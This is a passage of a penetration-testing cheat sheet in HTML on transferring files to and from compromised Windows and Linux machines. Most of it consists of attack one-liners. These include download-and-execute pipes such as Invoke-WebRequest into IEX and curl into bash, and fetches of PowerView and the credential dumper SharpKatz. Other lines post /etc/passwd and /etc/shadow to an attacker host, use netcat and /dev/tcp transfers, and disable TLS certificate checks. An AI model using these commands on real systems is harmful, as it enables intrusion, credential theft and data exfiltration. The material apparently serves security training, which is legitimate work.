+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFileAsync</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\Users\Public\Downloads\PowerViewAsync.ps1&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p><code class="invert">PowerShell Invoke-WebRequest</code>
+<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">Invoke-WebRequest</span> <span class="n">https</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">2</span><span class="p">/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-UseBasicParsing</span> <span class="p">|</span> <span class="nb">IEX</span>
+
+<span class="c"># Disable SSL/TLS secure channel</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span> <span class="p">=</span> <span class="p">{</span><span class="nv">$true</span><span class="p">}</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;</span><span class="p">)</span>
+</code></pre></div></p>
+<p><code class="invert">FTP Downloads</code>
+<div class="highlight"><pre><span></span><code>redparrot@parrot~$<span class="w"> </span>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;ftp://&lt;FTP_SERVER_IP&gt;/file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\Users\Public\ftp-file.txt&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p>Create a Command File for the FTP Client and Download the Target File.<br />
+Helpful in scenarios where we don't have an interactive shell in the remote server.
+<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">echo </span><span class="n">open</span> <span class="p">&lt;</span><span class="n">FTP_SERVER_IP</span><span class="p">&gt;</span> <span class="p">&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">echo </span><span class="n">USER</span> <span class="n">anonymous</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">echo </span><span class="n">binary</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">echo </span><span class="n">GET</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">echo </span><span class="n">bye</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="n">ftp</span> <span class="n">-v</span> <span class="n">-n</span> <span class="n">-s</span><span class="p">:</span><span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">ftp</span><span class="p">&gt;</span> <span class="n">open</span> <span class="p">&lt;</span><span class="n">FTP_SERVER_IP</span><span class="p">&gt;</span>
+<span class="n">Log</span> <span class="k">in</span> <span class="n">with</span> <span class="n">USER</span> <span class="n">and</span> <span class="n">PASS</span> <span class="n">first</span><span class="p">.</span>
+<span class="n">ftp</span><span class="p">&gt;</span> <span class="n">USER</span> <span class="n">anonymous</span>
+
+<span class="n">ftp</span><span class="p">&gt;</span> <span class="n">GET</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">ftp</span><span class="p">&gt;</span> <span class="n">bye</span>
+
+<span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span><span class="n">more</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">This</span> <span class="n">is</span> <span class="n">a</span> <span class="n">test</span> <span class="n">file</span>
+</code></pre></div></p>
+<h4 id="uploading-files-from-windows-to-linux"><span class="red-command">Uploading files from Windows to Linux</span></h4>
+<p><code class="invert">PowerShell Base64 Encode &amp; Decode</code>
+<div class="highlight"><pre><span></span><code><span class="c"># Base64 encode the /etc/hosts file using powershell</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-path</span> <span class="s2">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="n">-Encoding</span> <span class="n">byte</span><span class="p">))</span>
+
+<span class="p">&lt;</span><span class="n">BASE_64_ENCODED_CONTENTS_OF_FILE</span><span class="p">&gt;</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">Get-FileHash</span> <span class="s2">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="n">-Algorithm</span> <span class="n">MD5</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Hash</span>
+
+<span class="n">Hash</span>
+<span class="p">----</span>
+<span class="n">4388374325B992DEF12793500307AA34</span>
+
+<span class="c"># Decode the string in linux</span>
+<span class="nb">echo </span><span class="s2">&quot;&lt;BASE_64_ENCODED_CONTENTS_OF_FILE&gt;&quot;</span> <span class="p">|</span> <span class="n">base64</span> <span class="n">-d</span><span class="p">;</span> <span class="n">xclip</span> <span class="n">-selection</span> <span class="n">clipboard</span>
+</code></pre></div></p>
+<p><code class="invert">PowerShell Web Uploads</code>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>uploadserver<span class="w"> </span><span class="m">8080</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><span class="c"># Upload the file to python upload server running on Linux</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;</span><span class="p">)</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">Invoke-FileUpload</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">49</span><span class="p">.</span><span class="n">128</span><span class="p">:</span><span class="n">8080</span><span class="p">/</span><span class="n">upload</span> <span class="o">-File</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">etc</span><span class="p">\</span><span class="n">hosts</span>
+
+<span class="p">[+]</span> <span class="n">File</span> <span class="n">Uploaded</span><span class="p">:</span>  <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">etc</span><span class="p">\</span><span class="n">hosts</span>
+<span class="p">[+]</span> <span class="n">FileHash</span><span class="p">:</span>  <span class="n">5E7241D66FD77E9E8EA866B6278B2373</span>
+</code></pre></div>
+<p><code class="invert">PowerShell Base64 Web Upload</code>
+<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nv">$b64</span> <span class="p">=</span> <span class="no">[System.convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="s1">&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">))</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">49</span><span class="p">.</span><span class="n">128</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="n">-Body</span> <span class="nv">$b64</span>
+
+<span class="c"># In the linux VM</span>
+<span class="n">redparrot</span><span class="nv">@parrot</span><span class="p">~$</span> <span class="n">nc</span> <span class="n">-lvnp</span> <span class="n">8000</span>
+
+<span class="c"># catch the base64 encoded data and decode it in linux</span>
+<span class="n">redparrot</span><span class="nv">@parrot</span><span class="p">~$</span> <span class="nb">echo </span><span class="p">&lt;</span><span class="n">base64</span><span class="p">&gt;</span> <span class="p">|</span> <span class="n">base64</span> <span class="n">-d</span> <span class="n">-w</span> <span class="n">0</span> <span class="p">&gt;</span> <span class="n">hosts</span>
+</code></pre></div></p>
+<p><code class="invert">SMB Uploads</code>
+<div class="highlight"><pre><span></span><code>redparrot@parrot~$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code># Connecting to the Webdav Share from Windows
+C:\Users&gt; dir \\192.168.49.128\DavWWWRoot
+
+ Volume in drive \\192.168.49.128\DavWWWRoot has no label.
+ Volume Serial Number is 0000-0000
+
+ Directory of \\192.168.49.128\DavWWWRoot
+
+05/18/2022  10:05 AM    &lt;DIR&gt;          .
+05/18/2022  10:05 AM    &lt;DIR&gt;          ..
+05/18/2022  10:05 AM    &lt;DIR&gt;          sharefolder
+05/18/2022  10:05 AM                13 filetest.txt
+               1 File(s)             13 bytes
+               3 Dir(s)  43,443,318,784 bytes free
+</code></pre></div>
+<p><code class="invert">Uploading Files using SMB</code>
+<div class="highlight"><pre><span></span><code>C:\Users&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+C:\Users&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+</code></pre></div></p>
+<p><code class="invert">FTP Uploads</code></p>
+<div class="highlight"><pre><span></span><code>redparrot@parrot~$<span class="w"> </span>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span><span class="w"> </span>--write
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">UploadFile</span><span class="p">(</span><span class="s1">&#39;ftp://&lt;FTP_SERVER_IP&gt;/ftp-hosts&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="linux-file-transfer-methods"><strong>Linux File Transfer Methods</strong></h3>
+<h4 id="downloading-files-from-remote-host-to-linux"><span class="red-command">Downloading files from remote host to Linux</span></h4>
+<p><code class="invert">Web Downloads with Wget and cURL</code></p>
+<div class="highlight"><pre><span></span><code>wget<span class="w"> </span>&lt;URL&gt;<span class="w"> </span>-O<span class="w"> </span>/path/to/file.ext
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-o<span class="w"> </span>/path/to/file.ext<span class="w"> </span>&lt;URL&gt;
+</code></pre></div>
+<p><code class="invert">Fileless downloads</code></p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>wget<span class="w"> </span>-qO-<span class="w"> </span>https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>python3
+</code></pre></div>
+<p><code class="invert">Download with Bash (/dev/tcp)</code>
+There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">exec</span><span class="w"> </span><span class="m">3</span>&lt;&gt;/dev/tcp/10.10.10.32/80
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;GET /LinEnum.sh HTTP/1.1\n\n&quot;</span>&gt;<span class="p">&amp;</span><span class="m">3</span>
+cat<span class="w"> </span>&lt;<span class="p">&amp;</span><span class="m">3</span>
+</code></pre></div>
+<p><code class="invert">SSH Downloads</code>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>systemctl<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>ssh
+sudo<span class="w"> </span>systemctl<span class="w"> </span>start<span class="w"> </span>ssh
+netstat<span class="w"> </span>-lnpt
+scp<span class="w"> </span>plaintext@192.168.49.128:/root/myroot.txt<span class="w"> </span>.<span class="w"> </span>
+</code></pre></div></p>
+<h4 id="uploading-files-from-remote-host-to-linux"><span class="red-command">Uploading files from remote host to Linux</span></h4>
+<p><code class="invert">Web Upload</code><br />
+Setting up a python upload server with SSL/TLS enabled.</p>
+<div class="highlight"><pre><span></span><code>openssl<span class="w"> </span>req<span class="w"> </span>-x509<span class="w"> </span>-out<span class="w"> </span>server.pem<span class="w"> </span>-keyout<span class="w"> </span>server.pem<span class="w"> </span>-newkey<span class="w"> </span>rsa:2048<span class="w"> </span>-nodes<span class="w"> </span>-sha256<span class="w"> </span>-subj<span class="w"> </span><span class="s1">&#39;/CN=server&#39;</span>
+mkdir<span class="w"> </span>https<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>https
+python3<span class="w"> </span>-m<span class="w"> </span>uploadserver<span class="w"> </span><span class="m">443</span><span class="w"> </span>--server-certificate<span class="w"> </span>~/server.pem
+</code></pre></div>
+<p><code class="invert">Linux - Upload Multiple Files</code></p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://192.168.49.128/upload<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;files=@/etc/passwd&#39;</span><span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;files=@/etc/shadow&#39;</span><span class="w"> </span>--insecure
+</code></pre></div>
+<p><code class="invert">Linux - Creating a Web Server with Python3</code></p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">9001</span>
+</code></pre></div>
+<p><code class="invert">Linux - Creating a Web Server with Python2.7</code></p>
+<div class="highlight"><pre><span></span><code>python2.7<span class="w"> </span>-m<span class="w"> </span>SimpleHTTPServer
+</code></pre></div>
+<p><code class="invert">Linux - Creating a Web Server with PHP</code></p>
+<div class="highlight"><pre><span></span><code><span class="x">php -S 0.0.0.0:9000</span>
+</code></pre></div>
+<p><code class="invert">Linux - Creating a Web Server with Ruby</code></p>
+<div class="highlight"><pre><span></span><code><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">run</span><span class="w"> </span><span class="o">-</span><span class="n">ehttpd</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">-</span><span class="n">p8000</span>
+</code></pre></div>
+<p><code class="invert">Linux - Uploding and downloading files via SCP</code><br />
+Download a file from remote host via SSH key</p>
+<div class="highlight"><pre><span></span><code>scp<span class="w"> </span>-i<span class="w"> </span>~/.ssh/secret_key<span class="w"> </span>username@&lt;DNS/IP&gt;:/home/redparrot/downloadme.txt<span class="w"> </span>/tmp/downloaded.txt
+</code></pre></div>
+<p>Upload a file from remote host via SSH key
+<div class="highlight"><pre><span></span><code>scp<span class="w"> </span>-i<span class="w"> </span>~/.ssh/secret_key<span class="w"> </span>/tmp/uploadme.txt<span class="w"> </span>username@&lt;DNS/IP&gt;:/home/redparrot/uploaded.txt
+</code></pre></div></p>
+<p>Via password based authentication
+<div class="highlight"><pre><span></span><code>scp<span class="w"> </span>/etc/passwd<span class="w"> </span>redparrot@10.129.86.90:/home/redparrot/
+</code></pre></div></p>
+<h3 id="transferring-files-with-code"><strong>Transferring Files with Code</strong></h3>
+<p>File download - <code class="invert">Python3</code></p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import urllib.request;urllib.request.urlretrieve(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#39;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;</span>
+</code></pre></div>
+<p><div class="highlight"><pre><span></span><code>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;const BUFFER = 1024; $fremote = </span>
+<span class="s1">fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);&#39;</span>
+</code></pre></div>
+Fileless download - <code class="invert">PHP</code></p>
+<div class="highlight"><pre><span></span><code>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$lines = @file(&quot;&lt;URL_TO_CODE&gt;&quot;); foreach ($lines as $line_num =&gt; $line) { echo $line; }&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
+</code></pre></div>
+<p>File download - <code class="invert">Ruby</code></p>
+<div class="highlight"><pre><span></span><code>ruby<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;require &quot;net/http&quot;; File.write(&quot;LinEnum.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;)))&#39;</span>
+</code></pre></div>
+<p>File download - <code class="invert">Perl</code></p>
+<p><div class="highlight"><pre><span></span><code>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;);&#39;</span>
+</code></pre></div>
+File download - <code class="invert">JavaScript</code></p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">WinHttpReq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;WinHttp.WinHttpRequest.5.1&quot;</span><span class="p">);</span>
+<span class="nx">WinHttpReq</span><span class="p">.</span><span class="nx">Open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">WScript</span><span class="p">.</span><span class="nx">Arguments</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="cm">/*async=*/</span><span class="kc">false</span><span class="p">);</span>
+<span class="nx">WinHttpReq</span><span class="p">.</span><span class="nx">Send</span><span class="p">();</span>
+<span class="nx">BinStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;ADODB.Stream&quot;</span><span class="p">);</span>
+<span class="nx">BinStream</span><span class="p">.</span><span class="nx">Type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
+<span class="nx">BinStream</span><span class="p">.</span><span class="nx">Open</span><span class="p">();</span>
+<span class="nx">BinStream</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">WinHttpReq</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">);</span>
+<span class="nx">BinStream</span><span class="p">.</span><span class="nx">SaveToFile</span><span class="p">(</span><span class="nx">WScript</span><span class="p">.</span><span class="nx">Arguments</span><span class="p">(</span><span class="mf">1</span><span class="p">));</span>
+</code></pre></div>
+<p>File download - <code class="invert">JavaScript &amp; cscript</code>
+<div class="highlight"><pre><span></span><code>cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+</code></pre></div></p>
+<p>File download - <code class="invert">VBScript</code><br />
+<code>wget.vbs</code></p>
+<div class="highlight"><pre><span></span><code>dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
+dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
+xHttp.Open &quot;GET&quot;, WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+</code></pre></div>
+<p>We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
+<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="n">cscript</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">nologo</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span> <span class="n">https</span><span class="p">://</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">PowerShellMafia</span><span class="p">/</span><span class="n">PowerSploit</span><span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">Recon</span><span class="p">/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span> <span class="n">PowerView2</span><span class="p">.</span><span class="n">ps1</span>
+</code></pre></div></p>
+<p><code class="invert">Upload Operations using Python3</code>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>uploadserver<span class="w"> </span><span class="m">9001</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import requests;requests.post(&quot;http://192.168.49.128:8000/upload&quot;,files={&quot;files&quot;:open(&quot;/etc/passwd&quot;,&quot;rb&quot;)})&#39;</span>
+</code></pre></div>
+<h3 id="miscellaneous-file-transfer-methods"><strong>Miscellaneous File Transfer Methods</strong></h3>
+<h4 id="netcat"><span class="red-command">NetCat</span></h4>
+<p>Compromised Machine - Listening on Port 9000</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">9000</span><span class="w"> </span>&gt;<span class="w"> </span>SharpKatz.exe
+</code></pre></div>
+<p>Attack Host - Sending File to Compromised machine
+<div class="highlight"><pre><span></span><code>redparrot@parrot$<span class="w"> </span>wget<span class="w"> </span>-q<span class="w"> </span>https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+redparrot@parrot$<span class="w"> </span><span class="c1"># Example using Original Netcat</span>
+r3dp4rrot@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>nc<span class="w"> </span>-q<span class="w"> </span><span class="m">0</span><span class="w"> </span>&lt;ATTACKER<span class="err">&#39;</span>S_MACHINE&gt;<span class="w"> </span><span class="m">9000</span><span class="w"> </span>&lt;<span class="w"> </span>SharpKatz.exe
+</code></pre></div></p>
+<p>The option <code>-q 0</code> will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.  </p>
+<p>Attack Host - Sending File as Input to Netcat
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">443</span><span class="w"> </span>-q<span class="w"> </span><span class="m">0</span><span class="w"> </span>&lt;<span class="w"> </span>SharpKatz.exe
+</code></pre></div></p>
+<p>Compromised Machine Connect to Netcat to Receive the File
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="m">192</span>.168.49.128<span class="w"> </span><span class="m">443</span><span class="w"> </span>&gt;<span class="w"> </span>SharpKatz.exe
+</code></pre></div></p>
+<h4 id="ncat"><span class="red-command">Ncat</span></h4>
+<p>Compromised Machine - Listening on Port 9000.
+<div class="highlight"><pre><span></span><code>ncat<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">9000</span><span class="w"> </span>--recv-only<span class="w"> </span>&gt;<span class="w"> </span>SharpKatz.exe
+</code></pre></div></p>
+<p>Attack Host - Sending File to Compromised machine.
+<div class="highlight"><pre><span></span><code>ncat<span class="w"> </span>--send-only<span class="w"> </span><span class="m">192</span>.168.49.128<span class="w"> </span><span class="m">9000</span><span class="w"> </span>&lt;<span class="w"> </span>SharpKatz.exe
+</code></pre></div></p>
+<p>Attack Host - Sending File as Input to Netcat
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">443</span><span class="w"> </span>--send-only<span class="w"> </span>&lt;<span class="w"> </span>SharpKatz.exe
+</code></pre></div></p>
+<p>Compromised Machine Connect to Netcat to Receive the File
+<div class="highlight"><pre><span></span><code>ncat<span class="w"> </span><span class="m">192</span>.168.49.128<span class="w"> </span><span class="m">443</span><span class="w"> </span>--recv-only<span class="w"> </span>&gt;<span class="w"> </span>SharpKatz.exe
+</code></pre></div></p>
+<h4 id="devtcp"><span class="red-command">/dev/tcp</span></h4>
+<p>If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file <code>/dev/TCP/</code>.<br />
+Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.</p>
+<p>Compromised Machine Connecting to Netcat Using <code>/dev/tcp</code> to Receive the File
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>&lt;<span class="w"> </span>/dev/tcp/192.168.49.128/443<span class="w"> </span>&gt;<span class="w"> </span>SharpKatz.exe
+</code></pre></div></p>
+<h4 id="powershell-remoting"><span class="red-command">Powershell remoting</span></h4>
+<p>Useful for scenarios where HTTP, HTTPS, or SMB are unavailable. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.  </p>
+<p>Test the connection to computer DATABASE01
+<div class="highlight"><pre><span></span><code><span class="nb">Test-NetConnection</span> <span class="n">-ComputerName</span> <span class="n">DATABASE01</span> <span class="n">-Port</span> <span class="n">5985</span>
+<span class="n">ComputerName</span>     <span class="p">:</span> <span class="n">DATABASE01</span>
+<span class="n">RemoteAddress</span>    <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">101</span>
+<span class="n">RemotePort</span>       <span class="p">:</span> <span class="n">5985</span>
+<span class="n">InterfaceAlias</span>   <span class="p">:</span> <span class="n">Ethernet0</span>
+<span class="n">SourceAddress</span>    <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span>
+<span class="n">TcpTestSucceeded</span> <span class="p">:</span> <span class="n">True</span>
+</code></pre></div></p>
+<p>Create a PowerShell Remoting session to DATABASE01
+<div class="highlight"><pre><span></span><code><span class="nv">$Session</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">DATABASE01</span>
+</code></pre></div></p>
+<p>Copy samplefile.txt from our Localhost to the DATABASE01 Session
+<div class="highlight"><pre><span></span><code><span class="nb">Copy-Item</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">samplefile</span><span class="p">.</span><span class="n">txt</span> <span class="n">-ToSession</span> <span class="nv">$Session</span> <span class="n">-Destination</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span>
+</code></pre></div></p>
